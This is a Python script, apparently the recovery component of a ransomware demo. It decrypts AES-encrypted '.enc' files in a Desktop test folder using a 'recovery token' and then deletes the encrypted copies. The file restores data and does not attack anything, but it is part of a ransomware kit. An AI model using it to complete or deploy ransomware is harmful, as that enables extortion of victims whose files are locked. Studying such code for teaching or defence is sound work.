from getpass import getpass
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import platform  # Importing platform module
from helpers import derive_key, TOKEN

def decrypt_data(encrypted_data: bytes, password: str) -> bytes:
    salt = encrypted_data[:16]
    iv = encrypted_data[16:32]
    key = derive_key(password, salt)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded_data = decryptor.update(encrypted_data[32:]) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    data = unpadder.update(padded_data) + unpadder.finalize()
    return data

def decrypt_file(file_path: str, password: str) -> None:
    with open(file_path, "rb") as f:
        encrypted_data = f.read()
    data = decrypt_data(encrypted_data, password)
    original_file_path = file_path.replace(".enc", "")
    with open(original_file_path, "wb") as f:
        f.write(data)
    os.remove(file_path)
    print(f"Decrypted and deleted {file_path} -> {original_file_path}")

def decrypt_folder(folder_path: str, password: str) -> None:
    for root, _, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".enc"):
                file_path = os.path.join(root, file)
                decrypt_file(file_path, password)

def main():
    ascii_art = """
      _____                                                                              
     |  __ \                                                                             
     | |__) |   __ _   _ __    ___    ___    _ __ ___   __      __   __ _   _ __    ___  
     |  _  /   / _` | | '_ \  / __|  / _ \  | '_ ` _ \  \ \ /\ / /  / _` | | '__|  / _ \ 
     | | \ \  | (_| | | | | | \__ \ | (_) | | | | | | |  \ V  V /  | (_| | | |    |  __/ 
     |_|  \_\  \__,_| |_| |_| |___/  \___/  |_| |_| |_|   \_/\_/    \__,_| |_|     \___| 
    """
    print(ascii_art)
#  Automatically detect OS and set target directory
    target = os.path.join(os.path.expanduser("~"), "Desktop", "test")

    if not os.path.exists(target):
        print("Folder does not exist.")
        exit()

    # Ask user for the recovery token
    token = getpass("Enter the recovery token: ").strip()
   
    if not os.path.isdir(target):
        print(f"Invalid target directory: {target}")
        return
    
    try:
        decrypt_folder(target, token)
        print(f"Decrypted all files in {target}")
    except ValueError:
        print("Incorrect token. Decryption failed.")
        return
    except Exception as e:
        print(f"An error occurred during decryption: {e}")
    
if __name__ == "__main__":
    main()

	
